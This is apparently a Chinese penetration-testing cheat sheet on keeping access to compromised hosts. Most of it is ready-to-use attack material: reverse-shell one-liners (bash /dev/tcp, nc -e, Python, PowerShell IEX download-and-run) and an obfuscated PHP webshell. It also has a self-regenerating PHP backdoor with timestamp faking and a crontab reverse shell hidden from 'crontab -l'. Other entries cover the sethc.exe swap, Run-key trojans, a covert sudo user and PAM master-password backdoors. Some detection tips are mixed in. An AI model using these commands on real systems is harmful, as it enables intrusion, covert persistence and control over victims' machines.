---
title: 权限维持
---

## 反弹Shell

**攻击者VPS监听**

```bash
nc -lvp 9999
```

**BASH**

```bash
/bin/bash -i &> /dev/tcp/192.168.0.198/9999 <&1

/bin/sh -i &> /dev/tcp/192.168.0.198/9999 <&1
```

**Netcat**

```bash
nc -e /bin/bash 192.168.0.198 9999
```

**PowerShell**

将ps1脚本先放到VPS上

```powershell
##TCP
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.198 -port 9999

##UDP
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.159.134/nishang/Shells/Invoke-PowerShellUdp.ps1');Invoke-PowerShellUdp -Reverse -IPAddress 10.1.1.1 -port 53

##ICMP
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.159.134/nishang/Shells/Invoke-PowerShellIcmp.ps1');Invoke-PowerShellIcmp -IPAddress 192.168.159.134
```

**Python**

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.1.1.1",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**PHP**

https://github.com/pentestmonkey/php-reverse-shell

PHP 交互式反弹Shell，修改反弹IP后上传到目标访问一下即可。

## 获取Webshell

**隐藏WebShell**

> 1、仿照已存在的文件起名字，隐藏在深层目录， 创建…目录隐藏shell
> 2、利用静态文件，比如图片马然后利用 .htaccess 进行解析
> 3、修改WebShell时间戳为同目录下其它文件相同的时间

**快速应用**

直接上冰蝎加密shell，或哥斯拉内存马（基于tomcat）
冰蝎：https://github.com/rebeyond/Behinder
哥斯拉：https://github.com/BeichenDream/Godzilla

**PHP-Webshell**

文件免杀（Apache、Nginx特性）cmd

```php
<? assert(implode(reset(get_defined_vars())));	//返回由所有已定义变量所组成的数组 

Use age：cmd.php?a=system(whoami);

适用于PHP < 7.1 ，因为在PHP7.1之后assert被弃用了、7.2 create_function被弃用了
```

**内存马**

```php
//nodie_shell.php
<?php
	set_time_limit(0);			//设置脚本最大执行时间,0 即为无时间限制
	ignore_user_abort(true);	//设置与客户机断开不终止脚本的执行
	unlink(__FILE__);			//删除文件自身
	$file = '/var/www/html/.shell.php';	
	$code = '<?php if(md5($_POST["pass"])=="cdd7b7420654eb16c1e1b748d5b7c5b8"){@system($_POST[a]);}?>';
	while (1) {
		file_put_contents($file, $code);	//写shell文件
		system('touch -m -d "2014-10-31 13:50:11" .shell.php');		//修改时间戳
		usleep(1000);			//以指定的微秒数延缓程序的执行
	}
?>
```

**杀死PHP不死马**

```bash
1、高权限，重启服务
service apache2 restart
service php restart

2、低权限，杀掉所有进程
kill -9 -1
killall apache2
```

------------

## 文件传输

**Python搭建简单的HTTP服务**

```bash
python -m http.server 80

python2 -m SimpleHTTPServer 80
```

**SCP**

上传

```bash
scp 123.txt root@10.10.10.10:~/123.txt
```

下载

```bash
scp root@210.210.210.10:/home/root/1.txt ./1.txt
```

**Bash Download**

```bash
#服务器监听
nc -lp 1337 < 666.txt

#客户端下载
bash -c 'cat < /dev/tcp/10.10.10.10/1337 > 666.txt'
```

**certutil 下载**

```bash
certutil -urlcache -split -f http://10.10.10.10:80/npc.exe
```

**PowerShell 下载**

```bash
powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.174.1:1234/evil.txt','evil.exe')
```

**Windows查找文件**

```bash
dir /s *.jsp
```

```bash
for /r D:\developer %i in (*.jspx) do @echo %i
```

-----

## 系统后门

### Windows

**Schtasks后门**

Schtasks.exe能够在本地或远程计算机上创建，删除，查询，更改，运行和结束计划任务

不带参数运行Schtasks.exe会显示每个已注册任务的状态和下一次运行时间。

**wmi后门**

WMI后门使用了WMI的两个特征：**无文件**和**无进程**（需要管理员权限运行）。

**原理是**：将代码加密存储与WMI中，即无文件；调用PowerShell执行后门程序，执行后进程消失，即无进程。

**在Empire中使用Invoke-WMI模块**

```bash
usemodule powershell/persistence/elevated/wmi	#设置参数run
```

> **检查后门**：使用微软提供的工具`Autoruns`：
>
> https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns 

**DLL劫持后门**

DLL劫持原理就是使用 `loadlibrary` 动态加载DLL

DLL劫持工具：[SuperDllHijack](https://github.com/anhkgg/SuperDllHijack)

**映像劫持shift后门**

**替换sethc.exe为cmd.exe**

```bash
CD C:\windows\system32
cacls sethc.exe /t /e /G Administrators:f
cacls cmd.exe /t /e /G Administrators:f
ren sethc.exe aaa.exeren cmd.exe sethc.exe

#恢复
ren sethc.exe cmd.exeren aaa.exe sethc.exe
```

连按5下Shift弹出cmd窗口

> **检查后门**：连续按5下弹出cmd窗口（当然还有其它放大镜讲述人等）

木马加入开机启动项

```bash
reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v SunRAC /t reg_sz /d "C:\Users\Public\Downloads\msservice.exe" 
```

### Linux

**增加超级用户账号**

> **如果系统不允许`uid=0`的用户（`root`）远程登录，可以添加一个普通用户，并将其加入sudoers**

**增加用户**

```bash
useradd phP		
echo @admin.886|passwd --stdin phP

#添加账户
#设置密码(密码符合要密码强度策略)
```

**修改sudoers赋予sudo权限**

```bash
chmod +w /etc/sudoers    
echo "phP ALL=(ALL) ALL" >> /etc/sudoers	
chmod -w /etc/sudoers

#赋予写入权限
#添加sudo用户
#撤销写入权限
```

或者还可以修改/etc/passwd文件，把用户uid改为0。

**SSH公钥无密码登录**

```bash
ssh-keygen -t rsa    #本机生成rsa公钥

#把id_rsa.pub写入服务端的authorized_keys中
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh
echo "id_rsa.pub的内容" > ~/.ssh/authorized_keys

#没有这个文件的话，就自己创建一个
cd ~/
mkdir .ssh
cd .ssh
touch authorized_keys
```

**Crontab定时反弹shell**

```bash
(crontab -l;printf "*/1 * * * * exec 9<> /dev/tcp/攻击者IP/8888;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab -

#每分钟执行一次，并且crontab -l看不出来
#这种要用crontab -e 进去查看并编辑才能看到
```

**PAM后门**

>  **PAM （Pluggable Authentication Modules ）**是由Sun提出的一种认证机制。
>
>  它通过提供一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开
>
>  使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式，而无需更改服务程序
>
>  同时也便于向系统中添加新的认证手段

**步骤：**

1、获取目标系统所使用的PAM版本，下载对应版本的pam版本

2、解压缩，修改pam_unix_auth.c文件，添加万能密码

3、编译安装PAM

4、编译完后的文件在：modules/pam_unix/.libs/pam_unix.so，复制到/lib64/security中进行替换

​		即可使用万能密码登陆，并将用户名密码记录到文件中

**排查PAM后门技巧：**

1、通过Strace跟踪ssh

```bash
ps axu | grep sshd
strace -o aa -ff -p PID
grep open aa* | grep -v -e No -e null -e denied| grep WR
```

2、检查pam_unix.so的修改时间

```bash
stat /lib/security/pam_unix.so      #32位
stat /lib64/security/pam_unix.so    #64位
```

**Rootkit工具包**

> rootkit是一种特殊的恶意软件。三要素是：**隐藏、操纵、收集数据**。
>
> 功能是在安装目标上隐藏自身及指定的文件、进程和网络链接等信息
>
> 多见的rootkit一般都是木马、后门和其它恶意程序结合使用
>
> **Rootkit通过加载特殊的驱动，修改系统内核，进而达到隐藏信息的目的**
>
> Rootkit是攻击者用来隐藏自己的踪迹和保留root访问权限的工具

**Rootkit类型**

```bash
固件Rootkit
虚拟化Rootkit
内核级Rootkit
库级Rootkit
应用级Rootkit
```

**Rootkit工具包列表**：https://github.com/d30sa1/RootKits-List-Download  （注意与`Centos`版本适配）

**检测与防护：**

rkhunter：http://rkhunter.sourceforge.net/ 

chkrootkit：http://www.chkrootkit.org/download/ 

定期检查md5，对于找出的 Rootkit，最好的应对方法是擦除并重新安装系统